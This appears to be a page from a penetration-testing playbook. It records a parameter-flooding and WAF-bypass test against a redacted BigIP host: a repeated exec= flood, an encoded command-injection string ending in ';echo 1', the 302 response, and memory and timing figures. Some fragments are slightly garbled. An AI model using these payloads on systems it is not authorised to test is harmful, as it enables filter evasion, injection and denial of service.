<!-- Mirrored from manojxshrestha/playbook/docs/web-timing-attacks/proving-concept-scale.md -->
# Proving the Concept at Scale - Massive exec= Flood + Encoded Payload + Memory Observation

Technique: large-scale parameter flooding and WAF bypass testing.

**Massive request payload (partial - hundreds of repetitions):**
```
exec=1&exec=1&exec=1&exec=1&exec=1&exec=1&exec=1&exec=1&...
```

**Encoded injection at the end:**
```
()+{3a3b+}%3b+echo+1
```

**Response:**
```
HTTP/1.0 302 Moved Temporarily
Location: https://redacted.com/
Server: BigIP
Connection: Keep-Alive
Content-Length: 0
```

**Annotations:**
```
nowaf
```
→ WAF did not block this encoded payload

**Performance / memory measurements:**
```
125 bytes / 2,715 mills
Memory: 162MB
162.8MB
```

**Conclusion:**
```
Proving the concept at scale
```

**What this demonstrates:**
- Sending an extremely large number of repeated `exec=` parameters to test for parser/buffer overflow
- Combining with encoded command-like payloads (`%3b+echo+1` → attempt to inject `;echo 1`)
- Observing no WAF block (`nowaf`)
- Measuring memory impact (162 MB usage) and timing (2,715 ms)
- Goal: Prove that **mass repetition + encoding** can bypass filters, trigger redirects, and scale to reveal backend behavior or DoS conditions
